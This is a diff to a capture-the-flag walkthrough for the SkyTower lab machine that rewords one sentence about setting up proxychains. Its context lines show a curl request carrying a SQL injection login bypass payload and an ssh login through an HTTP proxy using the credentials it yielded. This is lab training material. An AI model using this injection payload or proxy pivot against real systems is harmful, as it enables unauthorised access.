@@ -43,7 +43,7 @@ curl --data "email=admin&password=' || 1=1#" http://192.168.56.101/login.php
 
 ![](pics/2.PNG)
 
-OK then we have some creds for the ssh that's behind this proxy. So we setup our /etc/proxychains.conf to use the http proxy on port 3128  then we can ssh into the box.
+OK then we have some creds for the ssh that's behind this proxy. The next step is setup our /etc/proxychains.conf to use the http proxy on port 3128 then we can ssh into the box.
 ```
 root@kali:~/machines/skytower# proxychains ssh john@192.168.56.101
 ProxyChains-3.1 (http://proxychains.sf.net)
